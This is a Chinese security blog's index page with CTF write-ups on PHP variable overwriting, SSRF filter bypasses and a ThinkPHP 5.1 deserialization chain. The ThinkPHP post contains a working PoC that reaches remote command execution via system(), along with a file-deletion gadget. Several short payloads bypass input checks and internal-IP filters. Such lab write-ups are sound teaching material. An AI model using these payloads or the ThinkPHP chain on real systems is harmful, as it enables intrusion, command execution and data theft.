<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="船到桥头自然直"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="船到桥头自然直"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>page - 船到桥头自然直</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">船到桥头自然直</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/04/19/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">
                PHP变量覆盖
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-04-19</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p><strong>extract</strong></p>
<pre><code>&lt;?php
highlight_file(__FILE__);
$flag = &quot;flag&#123;123&#125;&quot;;
extract($_GET);
if(isset($gift))&#123;
    $content = trim(@file_get_contents($flag));

    if($gift == $content)&#123;
        echo &quot;flag&#123;...&#125;&quot;;
    &#125;else&#123;
        echo &quot;no hacker&quot;;
    &#125;
&#125;</code></pre>
<p>当传入的flag=空时，file_get_contents 返回空。</p>
<p>payload</p>
<pre><code>?gift=&amp;flag=</code></pre>
<p><strong>$$</strong></p>
<pre><code>&lt;?php
highlight_file(__FILE__);
$flag = &quot;flag&#123;123&#125;&quot;;
$_403 = &quot;yes&quot;;
$_200 = &quot;no&quot;;
if($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)&#123;
    die(&quot;hacker&quot;);
&#125;
if(!isset($_POST[&quot;flag&quot;]))&#123;
    die($_403);
&#125;
foreach($_GET as $key =&gt; $value)&#123;
    $$key = $$value;
&#125;
foreach($_POST as $key =&gt; $value)&#123;
    $$key = $value;
&#125;
if($_POST[&quot;flag&quot;] !== $flag)&#123;
    die($_403);
&#125;
echo &quot;this is you flag&quot;.$flag;
die($_200);</code></pre>
<p>payload</p>
<pre><code>GET传 _200=flag
POST传 flag=</code></pre>
<p><strong>parse_str</strong></p>
<pre><code>&lt;?php
error_reporting(0);  
if(empty($_GET[&#39;id&#39;]))&#123;
    show_source(__FILE__);  
    die();
&#125;else&#123;
    $a=&quot;www.OPENCTF.com&quot;;
    $id=$_GET[&#39;id&#39;];
    @parse_str($id);
    if($a[0]!=&#39;QNKCDZO&#39;&amp;&amp;md5($a[0])==md5(&#39;QNKCDZO&#39;))&#123;
        echo &#39;flag&#123;123&#125;&#39;;
    &#125;else&#123;
        exit(&#39;其实很简单，其实并不难&#39;);
    &#125;
&#125;</code></pre>
<p>QNKCDZO的MD5加密后的值是0e830400451993494058024219903391，所以再找一个字符串，值和QNKCDZO不要，但MD5加密后的值是0e开头的字符串就行</p>
<p>payload</p>
<pre><code>?id=a[0]=s1836677006a</code></pre>
<p><strong>import_request_variables(string $types [, string $prefix ])</strong></p>
<p><strong>(PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0)</strong></p>
<pre><code>&lt;?php
$auth=&#39;0&#39;;
import_request_variables(&#39;G&#39;);
if($auth== 1)&#123;
echo&quot;private!&quot;;
&#125;else&#123;
echo&quot;public!&quot;;
&#125;
?&gt;</code></pre>
<p>G 表示GET  P表示POST  C表示COOKIE</p>
<p>payload</p>
<pre><code>?auth=1</code></pre>
<p><strong>绕过过滤的空白字符</strong></p>
<pre><code>&lt;?php
highlight_file(__FILE__);
$info = &quot;&quot;; 
$req = [];

ini_set(&quot;display_error&quot;, false); 
error_reporting(0); 

if(!isset($_GET[&#39;number&#39;]))&#123;
   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); 

   die(&quot;have a fun!!&quot;); 

&#125;

foreach([$_GET, $_POST] as $global_var) &#123;  
    foreach($global_var as $key =&gt; $value) &#123; 
        $value = trim($value); 
        is_string($value) &amp;&amp; $req[$key] = addslashes($value); 
    &#125; 
&#125; 


function is_palindrome_number($number) &#123; 
    $number = strval($number); 
    $i = 0; 
    $j = strlen($number) - 1;
    var_dump($number);
    echo &quot;&lt;br/&gt;&quot;;
    echo $number[$i];
    echo &quot;&lt;br/&gt;&quot;;
    echo $number[$j];
    while($i &lt; $j) &#123; 
        if($number[$i] !== $number[$j]) &#123; 
            return false; 
        &#125; 
        $i++; 
        $j--; 
    &#125; 
    return true; 
&#125; 

if(is_numeric($_REQUEST[&#39;number&#39;])) 
&#123;

   $info=&quot;sorry, you cann&#39;t input a number!&quot;;

&#125;
elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))) 
&#123;

     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  

&#125;
else
&#123;

     $value1 = intval($req[&quot;number&quot;]);
     $value2 = intval(strrev($req[&quot;number&quot;]));  

     if($value1!=$value2)&#123;
          $info=&quot;no, this is not a palindrome number!&quot;;
     &#125;
     else
     &#123;

          if(is_palindrome_number($req[&quot;number&quot;]))&#123;
              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; 
          &#125;
          else
          &#123;
             $info=&quot;flag&#123;...&#125;&quot;;
          &#125;
     &#125;

&#125;

echo $info;</code></pre>
<p>用%00绕过is_numeric</p>
<p>用%0c或者%2b绕过is_palindrome_number()函数</p>
<p>payload</p>
<pre><code>?number=%00%0c1</code></pre>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/04/15/ssrf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">
                ssrf绕过技巧
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-04-15</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p><strong>[第二章 web进阶]SSRF Training</strong></p>
<p>源码</p>
<pre><code>&lt;?php 
highlight_file(__FILE__);//用PHP高亮显示当前的文件
function check_inner_ip($url) //获取url的域名，将域名转为ip，然后再判断这个ip是否是私有地址
&#123; 
    $match_result=preg_match(&#39;/^(http|https)?:\/\/.*(\/)?.*$/&#39;,$url); 
      //返回$url的匹配,值将是 0 次（不匹配）或 1 
    //^从开头开始匹配
       //? 匹配0或1个正好在它之前的那个字符。注意：这个元字符不是所有的软件都支持的
    //( )标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 \( 和 \)
    //.    匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 
    //*    匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \*
    //$:从字符串末尾进行匹配
    if (!$match_result) 
    &#123; 
        die(&#39;url fomat error&#39;); 
        //如果url不符合正则表达式
    &#125; 
    try 
    &#123; 
        $url_parse=parse_url($url); 
        //分解出一个URL的各个部
        // $url_parse是一个数组

    &#125; 
    catch(Exception $e) 
    &#123; 
        die(&#39;url fomat error&#39;); 
        return false; 
    &#125; 
    $hostname=$url_parse[&#39;host&#39;]; //hostname 为主机名，也就是域名
    $ip=gethostbyname($hostname); //通过域名获取IP地址
    $int_ip=ip2long($ip); //ip2long：将IPv4的ip地址（以小数点分隔形式）转换为int
    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; 
    //判断是否是私有地址，是则这个函数就返回1
&#125; 

function safe_request_url($url) 
&#123; 

    if (check_inner_ip($url)) 
    //判断url是否是私有地址
    &#123; 
        echo $url.&#39; is inner ip&#39;; 
    &#125; 
    else 
    &#123;
        $ch = curl_init(); //初始化新的会话,返回 cURL 句柄，供curl_setopt()、 curl_exec() 和 curl_close() 函数使用
        curl_setopt($ch, CURLOPT_URL, $url); //访问的域名
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //
        curl_setopt($ch, CURLOPT_HEADER, 0); //
        //curl_setopt函数参数解释：https://www.cnblogs.com/lilyhomexl/p/6278921.html
        $output = curl_exec($ch); //抓取URL并把它传递给浏览器
        $result_info = curl_getinfo($ch); //php curl请求在curl_exec()函数执行之后，可以使用curl_getinfo()函数获取CURL请求输出的相关信息
        //[php curl curl_getinfo()返回参数详解](https://www.cnblogs.com/zqifa/p/php-curl-3.html)
        if ($result_info[&#39;redirect_url&#39;]) 
        &#123; 
            safe_request_url($result_info[&#39;redirect_url&#39;]); 
        &#125; 
        curl_close($ch); // 关闭cURL资源，并且释放系统资源
        var_dump($output); //执行
    &#125; 

&#125; 

$url = $_GET[&#39;url&#39;]; 
if(!empty($url))&#123; 
    safe_request_url($url); 
&#125; 
</code></pre>
<p>prase_url绕过</p>
<p><img src="/images/82.png"></p>
<p>传入的URL为<a target="_blank" rel="noopener" href="http://a:%40127.0.0.1%3A80@baidu.com,那么进入/">http://a:@127.0.0.1:80@baidu.com，那么进入</a> safe_request_url检测之后 parse_url取到的host是baidu.com，而curl取到的是127.0.0.1:80，所以就实现了检测IP时候是一个正常的一个网站域名而实际curl请求的时候是构造的127.0.0.1。</p>
<p>payload</p>
<pre><code>url=http://@127.0.0.1:80@baidu.com/flag.php</code></pre>
<p><strong>[第三章 web进阶]Python里的SSRF</strong></p>
<p><img src="/images/83.png"></p>
<p>尝试访问<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/api/internal/secret%E5%8F%91%E7%8E%B0127.0.0.1%E8%A2%ABban%E4%BA%86%E3%80%82">http://127.0.0.1:8000/api/internal/secret发现127.0.0.1被ban了。</a></p>
<p>用0.0.0.0代替127.0.0.1就是成功了，<br>127.0.0.1是本机的环回地址，0.0.0.0代表本机上任何IP地址，因此可以利用0.0.0.0来绕过127.0.0.1的过滤。</p>
<p>payload</p>
<pre><code>url=http://0.0.0.0:8000/api/internal/secret</code></pre>
<pre><code>本题有多重解法
0.0.0.0:8000 绕过
[::1]:8000 绕过（需要支持 ipv6)
重定向跳转到 127.0.0.1:8000
dns rebinding 输入一个域名，第一次解析到非 `127.0.0.1` 地址上，第二个解析到 `127.0.0.1` 上。
linux情况下0代表127.0.0.1  #即可以利用代http://0</code></pre>
<p>还有些技巧，本题不能用</p>
<pre><code>利用localhost绕过
利用16进制绕过http://0x7F000001 == http://127.0.0.1</code></pre>
<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyaowangchuan/article/details/110433971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161848766216780255280138%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161848766216780255280138&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-110433971.first_rank_v2_pc_rank_v29&utm_term=%5B%E7%AC%AC%E4%BA%8C%E7%AB%A0+web%E8%BF%9B%E9%98%B6%5DSSRF+Training">文章一</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/04/12/TP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
                TP5.1反序列化漏洞
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-04-12</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>s</p>
<p>环境搭建</p>
<p>BUU-N1BOOK[第三章 web进阶]thinkphp反序列化利用链 ，源码下载。</p>
<p>也可以自己百度TP5.1.x的源码</p>
<p>PHP版本7.0以上</p>
<p>修改代码</p>
<pre><code>&lt;?php
namespace app\index\controller;

class Index
&#123;
    public function index()
    &#123;
        return &quot;&lt;a href=&#39;www.zip&#39;&gt;download code&lt;/a&gt;&quot;;
    &#125;

    public function hello()
    &#123;
        unserialize($_POST[&#39;str&#39;]);
    &#125;
&#125;</code></pre>
<p>POP漏洞链</p>
<p>反序列化，最先就要寻找类中的__destruct方法。</p>
<p>在 <strong>think\process\pipes\Windows</strong> 类的 <strong>__destruct</strong> 方法中，存在一个删除文件功能，而这里的文件名 <strong>$filename</strong> 变量是可控。如果我们将一个类赋值给 <strong>$filename</strong> 变量，那么在 <strong>file_exists($filename)</strong> 的时候，就会触发这个类的 <strong>__toString</strong> 方法。因为 <strong>file_exists</strong> 函数需要的是一个字符串类型的参数，如果传入一个对象，就会先调用该类 <strong>__toString</strong> 方法，将其转换成字符串，然后再判断。</p>
<p><img src="/images/74.png"></p>
<p>这里有个unlink（$filename)存在任意文件删除漏洞。</p>
<p>POC</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

    <span class="token keyword">class</span> <span class="token class-name">Windows</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'要删除的文件路径'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">namespace</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
</code></pre>
<p>接下来，我们就来寻找可利用的 <strong>__toString</strong> 方法。全局搜索到的 <strong>__toString</strong> 方法其实不多，这里有两处都可以利用。它们的区别在于利用 <strong>think\Collection</strong> 构造的链要多构造一步，我们这里只分析链较短的 <strong>think\model\concern\Conversion</strong> 。</p>
<p><img src="/images/75.png"></p>
<p>如下图 <strong>第191-192行</strong> 所示，**$relation** 变量来自 <strong>$this-&gt;data[$name]</strong> ，而这个变量是可以控制的。<strong>第192行</strong> 的 <strong>$name</strong> 变量来自 <strong>$this-&gt;append</strong> ，也是可以控制的。所以 <strong>$relation-&gt;visible($name)</strong> 就变成了：<strong>可控类-&gt;visible(可控变量)</strong> 。那么接下来，就要找可利用的 <strong>visible</strong> 方法，或者没有 <strong>visible</strong> 方法，但有可利用的 <strong>__call</strong> 方法。</p>
<p><img src="/images/76.png"></p>
<p>全局搜了一下 <strong>visible</strong> 方法大概有3处，但是都不能利用，所以我们考虑寻找可利用的 <strong>__call</strong> 方法。在搜 <strong>__call</strong> 方法的时候，会发现有一处 <strong>think\Request</strong> 类比较好利用，因为这里 <strong>call_user_func_array</strong> 函数的第一个参数完全可控。构造 <strong>EXP</strong> 的时候可以传入数组，变成  <strong>call_user_func_array(array(任意类,任意方法),$args)</strong> ，这样我们就可以调用任意类的任意方法了。虽然第330行用 <strong>array_unshift</strong> 函数把本类对象 <strong>$this</strong> 放在数组变量 <strong>$args</strong> 的第一个，但是我们可以寻找不受这个参数影响的方法。</p>
<p><img src="/images/77.png"></p>
<p>分析过 <strong>ThinkPHP</strong> 历史 <strong>RCE</strong> 漏洞的人可能知道， <strong>think\Request</strong> 类的 <strong>input</strong> 方法经常是链中一个非常棒的 <strong>Gadget</strong> ，相当于 <strong>call_user_func($filter,$data)</strong> 。但是前面我们说过， <strong>$args</strong> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 <strong>input</strong> 方法，而应该寻找调用 <strong>input</strong> 的方法。</p>
<p><img src="/images/78.png"></p>
<p>调用 <strong>input</strong> 的方法共有7处，我这里直接选择比较简单的 <strong>request</strong> 方法来分析，因为这7处关键代码都类似。如果这里通过调用 <strong>request</strong> 方法间接调用 <strong>input</strong> 方法，实际上框架会报错退出的。因为这里传给 <strong>input</strong> 方法的 <strong>$name</strong> （下图右边第1092行），实际上是先前  <strong>call_user_func_array(array(任意类,任意方法),$args)</strong> 中 <strong>$args</strong> 数组的第一个变量，即我们前面说的一个固定死的类对象。然而如果把一个类对象作为 <strong>$data</strong> 传给 <strong>input</strong> 方法，那么在强转成字符串的时候（上图左边1354行），框架就会报错退出</p>
<p><img src="/images/79.png"></p>
<p>所以我们这里还要继续找有哪些地方调用了这7处。这里搜了调用 <strong>param</strong> 方法的地方，发现 <strong>isAjax</strong> 和 <strong>isPjax</strong> 都可以利用，因为他们传入 <strong>param</strong> 方法的第一个参数均可控。</p>
<p><img src="/images/80.png"></p>
<p>这样，整个漏洞链就构造完了。下面举个例子，比如我们想执行 <strong>system(‘id’)</strong> 代码，那么我们只要让传入的 <strong>Request</strong> 对象的 <strong>$this-&gt;filter=’system’</strong> 且 <strong>$this-&gt;param=array(‘id’)</strong> 即可。</p>
<p>流程图</p>
<p><img src="/images/81.png"></p>
<p>POC</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name">Windows</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
              <span class="token string">'yi'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
                <span class="token string">'yi'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">array</span><span class="token punctuation">(</span>
                   <span class="token string">'hello'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'world'</span>
                <span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">class</span> <span class="token class-name">Request</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token comment" spellcheck="true">// 表单请求类型伪装变量</span>
            <span class="token string">'var_method'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'_method'</span><span class="token punctuation">,</span>
            <span class="token comment" spellcheck="true">// 表单ajax伪装变量</span>
            <span class="token string">'var_ajax'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>
            <span class="token comment" spellcheck="true">// 表单pjax伪装变量</span>
            <span class="token string">'var_pjax'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'_pjax'</span><span class="token punctuation">,</span>
            <span class="token comment" spellcheck="true">// PATHINFO变量名 用于兼容模式</span>
            <span class="token string">'var_pathinfo'</span>     <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'s'</span><span class="token punctuation">,</span>
            <span class="token comment" spellcheck="true">// 兼容PATH_INFO获取</span>
            <span class="token string">'pathinfo_fetch'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">'ORIG_PATH_INFO'</span><span class="token punctuation">,</span> <span class="token string">'REDIRECT_PATH_INFO'</span><span class="token punctuation">,</span> <span class="token string">'REDIRECT_URL'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token comment" spellcheck="true">// 默认全局过滤方法 用逗号分隔多个</span>
            <span class="token string">'default_filter'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>
            <span class="token comment" spellcheck="true">// 域名根，如thinkphp.cn</span>
            <span class="token string">'url_domain_root'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>
            <span class="token comment" spellcheck="true">// HTTPS代理标识</span>
            <span class="token string">'https_agent_name'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>
            <span class="token comment" spellcheck="true">// IP代理获取标识</span>
            <span class="token string">'http_agent_ip'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'HTTP_X_REAL_IP'</span><span class="token punctuation">,</span>
            <span class="token comment" spellcheck="true">// URL伪静态后缀</span>
            <span class="token string">'url_html_suffix'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'html'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span><span class="token punctuation">[</span><span class="token string">'visible'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">'isAjax'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span><span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'cat /FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">namespace</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>

    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6467">https://xz.aliyun.com/t/6467</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/114975476">https://blog.csdn.net/zy15667076526/article/details/114975476</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/04/07/ssrf-gopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/">
                ssrf-gopher协议利用
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-04-07</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
